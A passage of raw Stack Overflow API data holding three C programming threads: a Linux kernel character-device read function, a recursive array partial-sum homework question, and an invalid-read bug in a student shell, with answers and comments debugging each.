7349116, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b06f9b8fc0adc2bd4e210dcf55ec0149?s=128&d=identicon&r=PG", "display_name": "Akihito", "link": "https://stackoverflow.com/users/7349116/akihito"}, "edited": false, "score": 0, "creation_date": 1482923185, "post_id": 41360472, "comment_id": 69922651, "body": "I have changed it but I still get only the last echo response"}, {"owner": {"reputation": 1667, "user_id": 4490542, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/8925b87f1bc4c6a3bc6956628c9d3b6f?s=128&d=identicon&r=PG&f=1", "display_name": "e.jahandar", "link": "https://stackoverflow.com/users/4490542/e-jahandar"}, "reply_to_user": {"reputation": 3, "user_id": 7349116, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b06f9b8fc0adc2bd4e210dcf55ec0149?s=128&d=identicon&r=PG", "display_name": "Akihito", "link": "https://stackoverflow.com/users/7349116/akihito"}, "edited": false, "score": 0, "creation_date": 1482924091, "post_id": 41360472, "comment_id": 69923157, "body": "it should be opy_to_user(buf, ringdev_buf, ringdev_len) not opy_to_user(buf, ringdev_buf, 4096)"}, {"owner": {"reputation": 3, "user_id": 7349116, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b06f9b8fc0adc2bd4e210dcf55ec0149?s=128&d=identicon&r=PG", "display_name": "Akihito", "link": "https://stackoverflow.com/users/7349116/akihito"}, "edited": false, "score": 0, "creation_date": 1482924945, "post_id": 41360472, "comment_id": 69923581, "body": "Yes in my code i have got copy_to_user(buf,ringdev_buf,ringdev_len) and the problem is still  happening. I realy don&#39;t know why it happen"}, {"owner": {"reputation": 1667, "user_id": 4490542, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/8925b87f1bc4c6a3bc6956628c9d3b6f?s=128&d=identicon&r=PG&f=1", "display_name": "e.jahandar", "link": "https://stackoverflow.com/users/4490542/e-jahandar"}, "reply_to_user": {"reputation": 3, "user_id": 7349116, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b06f9b8fc0adc2bd4e210dcf55ec0149?s=128&d=identicon&r=PG", "display_name": "Akihito", "link": "https://stackoverflow.com/users/7349116/akihito"}, "edited": false, "score": 0, "creation_date": 1482926740, "post_id": 41360472, "comment_id": 69924639, "body": "the return value of read function is incorrect in case of successful read"}, {"owner": {"reputation": 3, "user_id": 7349116, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b06f9b8fc0adc2bd4e210dcf55ec0149?s=128&d=identicon&r=PG", "display_name": "Akihito", "link": "https://stackoverflow.com/users/7349116/akihito"}, "edited": false, "score": 0, "creation_date": 1482945553, "post_id": 41360472, "comment_id": 69934939, "body": "I have changed  it. but still i only get the last echo response :;"}, {"owner": {"reputation": 1667, "user_id": 4490542, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/8925b87f1bc4c6a3bc6956628c9d3b6f?s=128&d=identicon&r=PG&f=1", "display_name": "e.jahandar", "link": "https://stackoverflow.com/users/4490542/e-jahandar"}, "reply_to_user": {"reputation": 3, "user_id": 7349116, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b06f9b8fc0adc2bd4e210dcf55ec0149?s=128&d=identicon&r=PG", "display_name": "Akihito", "link": "https://stackoverflow.com/users/7349116/akihito"}, "edited": false, "score": 0, "creation_date": 1482987333, "post_id": 41360472, "comment_id": 69948314, "body": "i think the problem is on rest of the code, edit your question and include them"}], "tags": [], "owner": {"reputation": 1667, "user_id": 4490542, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/8925b87f1bc4c6a3bc6956628c9d3b6f?s=128&d=identicon&r=PG&f=1", "display_name": "e.jahandar", "link": "https://stackoverflow.com/users/4490542/e-jahandar"}, "is_accepted": false, "score": 1, "last_activity_date": 1482922340, "creation_date": 1482922340, "answer_id": 41360472, "question_id": 41359672, "link": "https://stackoverflow.com/questions/41359672/linux-kernel-write-and-read-function/41360472#41360472", "title": "Linux Kernel write() and read() function", "body": "<p>Calling of copy_to_user(buf, ringdev_buf,1) causes 1 byte copy from ringdev_buf to buf, so its right, if you want copy entire buffer to userspace, you have to change it to copy_to_user(buf, ringdev_buf, ringdev_len)</p>\n"}, {"tags": [], "owner": {"reputation": 3, "user_id": 7349116, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b06f9b8fc0adc2bd4e210dcf55ec0149?s=128&d=identicon&r=PG", "display_name": "Akihito", "link": "https://stackoverflow.com/users/7349116/akihito"}, "is_accepted": false, "score": 0, "last_activity_date": 1484322724, "creation_date": 1484322724, "answer_id": 41638482, "question_id": 41359672, "link": "https://stackoverflow.com/questions/41359672/linux-kernel-write-and-read-function/41638482#41638482", "title": "Linux Kernel write() and read() function", "body": "<pre><code> if (copy_to_user(buf, ringdev_buf,ringdev_len)) \n</code></pre>\n\n<p>should be:</p>\n\n<pre><code> if (copy_to_user(buf, ringdev_buf,ringdev_len)==0)\n</code></pre>\n\n<p>additionally, I  didn't make correctly the char device.  But thank you for help :). If someone needs I can post here my write/read  function on a cyclic buffer, where every think works correctly. </p>\n"}], "owner": {"reputation": 3, "user_id": 7349116, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b06f9b8fc0adc2bd4e210dcf55ec0149?s=128&d=identicon&r=PG", "display_name": "Akihito", "link": "https://stackoverflow.com/users/7349116/akihito"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2898, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1484322724, "creation_date": 1482919513, "last_edit_date": 1482945530, "question_id": 41359672, "link": "https://stackoverflow.com/questions/41359672/linux-kernel-write-and-read-function", "title": "Linux Kernel write() and read() function", "body": "<p>Hello I need some help with my code for school. </p>\n\n<p>The read function should never <code>return 0</code> so Teacher told us to use <code>wait_event_interruptible</code>. </p>\n\n<p>My problem is when I want to try it using (for exmaple) commands in console :</p>\n\n<pre><code>echo 1234 &gt; ringdev # my character device\necho 5 &gt; ringdev \ncat ringdev\n</code></pre>\n\n<p>I only get a result: <code>5</code>. </p>\n\n<p>I want to get a result: </p>\n\n<p><code>1234\n5</code>. </p>\n\n<p>The global variables:</p>\n\n<pre><code> static char ringdev_buf[4096];\n static size_t ringdev_len;\n</code></pre>\n\n<p>Read function:</p>\n\n<pre><code>static ssize_t ringdev_read(struct file *filp, char __user *buf, size_t count,\n        loff_t *off)\n{      \n    ssize_t ret = 0;\n    while(1) {\n        wait_event_interruptible(head,ringdev_len!=0);\n        mutex_lock(&amp;ringdev_lock);\n        if(ringdev_len!=0) {\n            ret = -EFAULT;\n            if (copy_to_user(buf, ringdev_buf,ringdev_len)) { // I was trying everything in the ringdev_len position. \n                ret = ringdev_len;\n                goto out_unlock;\n            }\n        }\n        mutex_unlock(&amp;ringdev_lock);\n    }\n    out_unlock:\n    mutex_unlock(&amp;ringdev_lock);\n    return ret;\n}\n</code></pre>\n\n<p>I was trying to put any value in count in function <code>copy_to_user(buf, ringdev_buf,count)</code> but the result was always the same.</p>\n\n<pre><code>static ssize_t ringdev_write(struct file *filp, const char __user *buf,\n        size_t count, loff_t *off)\n{\n    ssize_t ret=0;\n    mutex_lock(&amp;ringdev_lock);\n    ret=-EFAULT;\n    if(ringdev_len + count &lt; sizeof(ringdev_buf)) {\n        if (copy_from_user(ringdev_buf+ringdev_len, buf, count)==0) {\n            ringdev_len=ringdev_len+count;\n            ret=count;\n            wake_up_interruptible(&amp;head);\n            goto out_unlock;\n        }\n    } else {\n       ret=-ENOSPC;\n    }\n    out_unlock:\n    mutex_unlock(&amp;ringdev_lock);\n    return ret;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1482918803, "post_id": 41359435, "comment_id": 69920336, "body": "When you allocate memory in <code>sum_till_last</code> that memory is not initialized, its contents is <i>indeterminate</i>. You can&#39;t use it (which you do when you call <code>arr_sum</code>) until you have initialized the memory. I also wonder why you pass <code>ar</code> as an argument to <code>sum_till_last</code> since it is used as a local variable?"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1482918818, "post_id": 41359435, "comment_id": 69920342, "body": "What is your question now? What happens when you run it in a debugger?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1482918891, "post_id": 41359435, "comment_id": 69920382, "body": "Also please try to create a <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable Example</a> and show us, including how you <i>actually</i> call the <code>sum_till_last</code> function. Also please  <a href=\"http://stackoverflow.com/help/how-to-ask\">read about how to ask good questions</a>. And while you&#39;re editing your question then show us the input you use, and the expected and actual output."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1482919053, "post_id": 41359435, "comment_id": 69920453, "body": "Lastly, I assume that the base case should be <code>n &lt;= 0</code>? Otherwise when <code>n</code> is zero you will return <code>arr[0] + arr_sum(arr, -1)</code>, effectively <code>arr[0] + arr[0]</code>."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1482919316, "post_id": 41359435, "comment_id": 69920575, "body": "For <code>n&lt;0</code> you should use 0 in <code>arr_sum</code> and you should not store your result in <code>arr[i]</code> in <code>main</code> as it spoils your array for the next execution of your loop."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1482922003, "post_id": 41359435, "comment_id": 69922067, "body": "Can&#39;t <code>arr_sum</code> simply be: <code>return (n &gt; 0) ? *arr + arr_sum(arr+1,n-1) : 0;</code> , assuming your intention was recursion (that no one would ever actually do outside of academia?)"}], "answers": [{"tags": [], "owner": {"reputation": 28, "user_id": 3815801, "user_type": "registered", "profile_image": "https://graph.facebook.com/100001086536213/picture?type=large", "display_name": "Alex Banu", "link": "https://stackoverflow.com/users/3815801/alex-banu"}, "is_accepted": false, "score": 0, "last_activity_date": 1482919243, "creation_date": 1482919243, "answer_id": 41359604, "question_id": 41359435, "link": "https://stackoverflow.com/questions/41359435/find-partial-sum-of-x-numbers-in-array-in-c/41359604#41359604", "title": "Find partial sum of &#39;X&#39; numbers in array in c", "body": "<p>Here you go:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main () {\n   int in_arr[5] = {4,13,23,21,11};\n   int out_arr[5];\n   int p_sum =0;\n   int i;\n\n   for ( i=0;i&lt;5;i++){\n      out_arr[i] = in_arr[i]+p_sum;\n      p_sum=p_sum+in_arr[i];\n   }\n\n   for (i=0;i&lt;5;i++){\n      printf(\"%d\", out_arr[i] );\n   }  \n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 3, "creation_date": 1482919750, "post_id": 41359632, "comment_id": 69920800, "body": "You can&#39;t use <code>sizeof(arr)</code> to get the size of an array passed as function argument. The size will only be size of a pointer. You need to pass the number of elements as extra parameter"}, {"owner": {"reputation": 456, "user_id": 7325567, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KVQzO.png?s=128&g=1", "display_name": "Gabri T", "link": "https://stackoverflow.com/users/7325567/gabri-t"}, "reply_to_user": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1482920603, "post_id": 41359632, "comment_id": 69921297, "body": "you are right :) sorry i don&#180;t use C for long. i will change it"}, {"owner": {"reputation": 456, "user_id": 7325567, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KVQzO.png?s=128&g=1", "display_name": "Gabri T", "link": "https://stackoverflow.com/users/7325567/gabri-t"}, "edited": false, "score": 0, "creation_date": 1482925628, "post_id": 41359632, "comment_id": 69923976, "body": "you are right, in this new implementation it&#180;s actually quite simple :)"}], "tags": [], "owner": {"reputation": 456, "user_id": 7325567, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KVQzO.png?s=128&g=1", "display_name": "Gabri T", "link": "https://stackoverflow.com/users/7325567/gabri-t"}, "is_accepted": false, "score": 0, "last_activity_date": 1482925421, "last_edit_date": 1482925421, "creation_date": 1482919383, "answer_id": 41359632, "question_id": 41359435, "link": "https://stackoverflow.com/questions/41359435/find-partial-sum-of-x-numbers-in-array-in-c/41359632#41359632", "title": "Find partial sum of &#39;X&#39; numbers in array in c", "body": "<p>I just made it simple so it\u00b4s easy to understand :)\nI\u00b4m assuming \"n\" is always equal or less then array element number. Then you just print the SUM.</p>\n\n<pre><code>  #include  &lt;stdio.h&gt;\n\n     int arr_sum( int arr[], int n ){\n         int i=0,SUM=0;   \n         for(; i &lt; n;i++){\n           SUM= SUM+ arr[i];\n           printf(\"%d \",SUM);\n         }  \n    }\n\n     int main(void) {\n         int array[] = {4, 13, 23, 21, 11};\n         arr_sum(array,5);\n         return 0;\n     }\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 27, "user_id": 7349129, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/10209734112642212/picture?type=large", "display_name": "Alex Zelentsov", "link": "https://stackoverflow.com/users/7349129/alex-zelentsov"}, "edited": false, "score": 0, "creation_date": 1482924363, "post_id": 41360467, "comment_id": 69923279, "body": "Thank you. its very nice that you also put explanation. its very helped"}, {"owner": {"reputation": 27, "user_id": 7349129, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/10209734112642212/picture?type=large", "display_name": "Alex Zelentsov", "link": "https://stackoverflow.com/users/7349129/alex-zelentsov"}, "edited": false, "score": 0, "creation_date": 1482925378, "post_id": 41360467, "comment_id": 69923836, "body": "what did error mean \t&gt;&gt;&gt;\t&#39;&#39;IntelliSense: a value of type &quot;void *&quot; cannot be assigned to an entity of type &quot;int *&quot;"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "reply_to_user": {"reputation": 27, "user_id": 7349129, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/10209734112642212/picture?type=large", "display_name": "Alex Zelentsov", "link": "https://stackoverflow.com/users/7349129/alex-zelentsov"}, "edited": false, "score": 0, "creation_date": 1482926602, "post_id": 41360467, "comment_id": 69924549, "body": "@AlexZelentsov You use C++ as C. In that case Change to <code>int *temp = (int*)malloc(si * sizeof(int));</code>. But C does not need such a cast."}], "tags": [], "owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "is_accepted": false, "score": 0, "last_activity_date": 1482922316, "creation_date": 1482922316, "answer_id": 41360467, "question_id": 41359435, "link": "https://stackoverflow.com/questions/41359435/find-partial-sum-of-x-numbers-in-array-in-c/41360467#41360467", "title": "Find partial sum of &#39;X&#39; numbers in array in c", "body": "<p>Fix according to your policy</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint arr_sum(int arr[], int n){\n    if (n == 0){//Change to this\n        return arr[0];\n    } else {\n        return arr[n] + arr_sum(arr, n-1);\n    }\n}\n\nvoid sum_till_last(int *ar, int si){\n    int sum,i;\n    int *temp = malloc(si * sizeof(int));//variable name ar is shadowing parameter name ar.\n\n    for(i = 0; i &lt; si; i++){\n        temp[i] = arr_sum(ar, i);\n        if(i)\n            putchar(' ');\n        printf(\"%d\", temp[i]);//need print out :D\n    }\n    free(temp);\n}\n\nint main(void){\n    int i, a[5];\n\n    for (i = 0; i &lt; 5; i++)\n        scanf_s(\"%d\", &amp;a[i]);\n\n    sum_till_last(a, 5);\n    //printf(\"%d\\n\",a[5]);&lt;-- this print only one element. and It's out of bounds element XD \n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 2, "last_activity_date": 1482924584, "creation_date": 1482924584, "answer_id": 41361156, "question_id": 41359435, "link": "https://stackoverflow.com/questions/41359435/find-partial-sum-of-x-numbers-in-array-in-c/41361156#41361156", "title": "Find partial sum of &#39;X&#39; numbers in array in c", "body": "<p>Now when we can see the full code, it's quite obvious that the problem is in the <code>sum_till_last</code> function where you overwrite the pointer you pass to the function with some new and uninitialized memory you allocate.</p>\n\n<p>Drop the allocation (and the call to <code>free</code> of course). And fix the logical bug in <code>arr_sum</code> that causes you to get <code>arr[0] + arr[0]</code> when <code>i</code> is zero.</p>\n"}], "owner": {"reputation": 27, "user_id": 7349129, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/10209734112642212/picture?type=large", "display_name": "Alex Zelentsov", "link": "https://stackoverflow.com/users/7349129/alex-zelentsov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1255, "favorite_count": 0, "answer_count": 4, "score": 0, "last_activity_date": 1482925421, "creation_date": 1482918635, "last_edit_date": 1482921040, "question_id": 41359435, "link": "https://stackoverflow.com/questions/41359435/find-partial-sum-of-x-numbers-in-array-in-c", "title": "Find partial sum of &#39;X&#39; numbers in array in c", "body": "<p>can you help me with code which returns partial sum of 'X' numbers in array in c? </p>\n\n<p>Complete :</p>\n\n<pre><code>    int arr_sum( int arr[], int n )//Recursive sum of array\n     { \n      if (n &lt; 0) //base case:\n      {\n\n        return arr[0];\n      }\n      else\n      {\n        return arr[n] + arr_sum(arr, n-1);\n      }\n    }\n    void sum_till_last (int *ar,int si )\n    {\n\n        **int sum,i;// the problem some where here\n        ar=(int*) malloc(si*sizeof(int));\n\n        for (i=0; i&lt;si;i++)\n        {\n\n            sum=arr_sum(ar,i);\n            ar [i]=sum;\n        }\n        free (ar);**\n    }\n\n\n void main ()\n{\n    int i;\n    int a [5];\n    for (i = 0; i &lt; 5; i++)\n      scanf_s(\"%d\", &amp;a[i]);\n\n    sum_till_last(a,5);\n    printf(\"%d\\n\",a[5]);\n}\n</code></pre>\n\n<p>\\i want to create new array with this this legality:\nMy input :</p>\n\n<p>4\n13\n23\n21\n11</p>\n\n<p>The output should be (without brackets or commas):</p>\n\n<p>4 \n17\n40\n61 \n72</p>\n"}, {"tags": ["c", "realloc"], "comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 1, "creation_date": 1482918317, "post_id": 41359305, "comment_id": 69920090, "body": "Please post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 2, "creation_date": 1482918357, "post_id": 41359305, "comment_id": 69920107, "body": "Are you saying you&#39;re doing <code>free(&quot;&quot;)</code>? Because yes, that would obviously cause issues."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1482918461, "post_id": 41359305, "comment_id": 69920163, "body": "Casting <code>malloc()</code> to <code>(void *)</code> makes no sense. If you did this to avoid compiler warnings, your code has bigger problems. Did you forget to <code>#include &lt;stdlib.h&gt;</code>?"}, {"owner": {"reputation": 745, "user_id": 2562564, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/ef1939aba4fb7a820c0e96e4a7c53a70?s=128&d=identicon&r=PG&f=1", "display_name": "TenTen Peter", "link": "https://stackoverflow.com/users/2562564/tenten-peter"}, "edited": false, "score": 1, "creation_date": 1482918630, "post_id": 41359305, "comment_id": 69920244, "body": "No,the libraries are there, Sorry I can&#39;t post a working example the code is too long and has many functions."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 1, "creation_date": 1482918711, "post_id": 41359305, "comment_id": 69920293, "body": "BTW <code>memcpy(real, ptr, strlen(ptr));  memset(real, 0, len);</code> --&gt; <code>memset(real, 0, len);memcpy(real, ptr, strlen(ptr));</code>"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1482918712, "post_id": 41359305, "comment_id": 69920294, "body": "@TenTenPeter That&#39;s why you&#39;re supposed to reduce it before posting. By removing all the irrelevant parts you&#39;ll either discover the problem yourself or you&#39;ll end up with a much more focused question."}, {"owner": {"reputation": 745, "user_id": 2562564, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/ef1939aba4fb7a820c0e96e4a7c53a70?s=128&d=identicon&r=PG&f=1", "display_name": "TenTen Peter", "link": "https://stackoverflow.com/users/2562564/tenten-peter"}, "edited": false, "score": 0, "creation_date": 1482918936, "post_id": 41359305, "comment_id": 69920395, "body": "if the returned value from <code>*cmd = ft_search_replace(search, 0, 0, 0);</code> is <code>hello</code> and I try to edit it to <code>hello world</code> this&#39;s where I get invalid read, even though <code>cmd</code> was allocated <code>256</code>."}, {"owner": {"reputation": 745, "user_id": 2562564, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/ef1939aba4fb7a820c0e96e4a7c53a70?s=128&d=identicon&r=PG&f=1", "display_name": "TenTen Peter", "link": "https://stackoverflow.com/users/2562564/tenten-peter"}, "reply_to_user": {"reputation": 6975, "user_id": 3121023, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f52448806175b9aa66c86d40cf0829f1?s=128&d=identicon&r=PG&f=1", "display_name": "user3121023", "link": "https://stackoverflow.com/users/3121023/user3121023"}, "edited": false, "score": 0, "creation_date": 1482919067, "post_id": 41359305, "comment_id": 69920461, "body": "@user3121023 so I need to free <code>cmd</code> and reallocate memory again?"}, {"owner": {"reputation": 745, "user_id": 2562564, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/ef1939aba4fb7a820c0e96e4a7c53a70?s=128&d=identicon&r=PG&f=1", "display_name": "TenTen Peter", "link": "https://stackoverflow.com/users/2562564/tenten-peter"}, "reply_to_user": {"reputation": 6975, "user_id": 3121023, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f52448806175b9aa66c86d40cf0829f1?s=128&d=identicon&r=PG&f=1", "display_name": "user3121023", "link": "https://stackoverflow.com/users/3121023/user3121023"}, "edited": false, "score": 0, "creation_date": 1482920839, "post_id": 41359305, "comment_id": 69921439, "body": "@user3121023 what about <code>strcpy</code> instead of <code>=</code> I think it might solve the problem without discarding memory allocation."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1482921434, "post_id": 41359305, "comment_id": 69921762, "body": "A couple of stylistic comments: <code>sizeof(char)</code> is <code>1</code> by definition, so multiplying by it is never necessary. And in C code, you should not cast the return value of <code>malloc</code>, and in particular <code>(void *)malloc(\u2026)</code> is completely pointless since the type is already <code>void *</code>."}], "answers": [{"tags": [], "owner": {"reputation": 745, "user_id": 2562564, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/ef1939aba4fb7a820c0e96e4a7c53a70?s=128&d=identicon&r=PG&f=1", "display_name": "TenTen Peter", "link": "https://stackoverflow.com/users/2562564/tenten-peter"}, "is_accepted": false, "score": 3, "last_activity_date": 1482921258, "last_edit_date": 1495539963, "creation_date": 1482921258, "answer_id": 41360156, "question_id": 41359305, "link": "https://stackoverflow.com/questions/41359305/how-to-solve-invalid-read-in-c/41360156#41360156", "title": "How to solve invalid read in C", "body": "<p>Ok, I have managed to solve the issue, as <a href=\"https://stackoverflow.com/users/3121023/user3121023\">user3121023</a> pointed out that <code>*cmd =</code> will discard the memory allocation, I decided to use <code>strcpy</code> and <code>memset</code> instead of <code>=</code>.</p>\n\n<pre><code>//libraries here\n# define SIZE 256   \n\nchar *cmd = malloc(sizeof(char) * SIZE);\n\nvoid    ft_man_search_replace(char **cmd, int *pos, t_stack hist)\n{\n    char            **split;\n    t_search_hist   search;\n    int             i;\n\n    // splits ^string^string^ into array\n    split = ft_strsplit(*cmd + 1, '^');\n    i = *pos;\n    // get previous history and assign it to haystack\n    search.haystack = ft_get_prev_hist(hist);\n    search.needle = split[0];\n    search.with = split[1];\n    memset(*cmd, 0, SIZE);\n    strcpy(*cmd, ft_search_replace(search, 0, 0, 0));\n     //if returned string is equal to *cmd, there was no match\n     //assign *cmd to empty string.\n    if (ft_strequ(search.haystack, *cmd))\n    {\n        ft_putendl(\"\\n21sh: substitution failed\");\n        memset(*cmd, 0, SIZE);\n        strcpy(*cmd, \"\");\n        *pos = 0;\n        return ;\n    }\n    i = ft_strlen(*cmd);\n    ft_cursor(*cmd, i + 1, &amp;hist);\n    *pos = i;\n}\n</code></pre>\n"}], "owner": {"reputation": 745, "user_id": 2562564, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/ef1939aba4fb7a820c0e96e4a7c53a70?s=128&d=identicon&r=PG&f=1", "display_name": "TenTen Peter", "link": "https://stackoverflow.com/users/2562564/tenten-peter"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 148, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1482921258, "creation_date": 1482918137, "last_edit_date": 1482918824, "question_id": 41359305, "link": "https://stackoverflow.com/questions/41359305/how-to-solve-invalid-read-in-c", "title": "How to solve invalid read in C", "body": "<p>I'm having an invalid read issue with my program, I'm creating a simple shell in c which support history and it's built-ins. Here's my problem I have a variable </p>\n\n<pre><code> char *cmd = malloc(sizeof(char) * 256);\n</code></pre>\n\n<p>Wen I run the command <code>^p^l^</code>, now <code>cmd = ^p^l^</code>, I pass <code>cmd</code> to a search function that searches through history and return a match or the same string. <code>ft_man_search_replace(&amp;cmd, &amp;pos, hist)</code></p>\n\n<pre><code>void    ft_man_search_replace(char **cmd, int *pos, t_stack hist)\n{\n    char            **split;\n    t_search_hist   search;\n    int             i;\n\n    // splits ^string^string^ into array\n    split = ft_strsplit(*cmd + 1, '^');\n    i = *pos;\n    // get previous history and assign it to haystack\n    search.haystack = ft_get_prev_hist(hist);\n    search.needle = split[0];\n    search.with = split[1];\n    *cmd = ft_search_replace(search, 0, 0, 0);\n     //if returned string is equal to *cmd, there was no match\n     //assign *cmd to empty string.\n    if (ft_strequ(search.haystack, *cmd))\n    {\n        ft_putendl(\"\\n21sh: substitution failed\");\n        *cmd = \"\";\n        *pos = 0;\n        return ;\n    }\n    i = ft_strlen(*cmd);\n    ft_cursor(*cmd, i + 1, &amp;hist);\n    *pos = i;\n}\n</code></pre>\n\n<p>After running this function it's seems that <code>cmd</code> is no longer having memory allocation of <code>256</code>, when I type something I get invalid read my guess is that I'm reaching the end of the string. e.g if the match was not found I assign <code>*cmd = \"\"</code>, now if 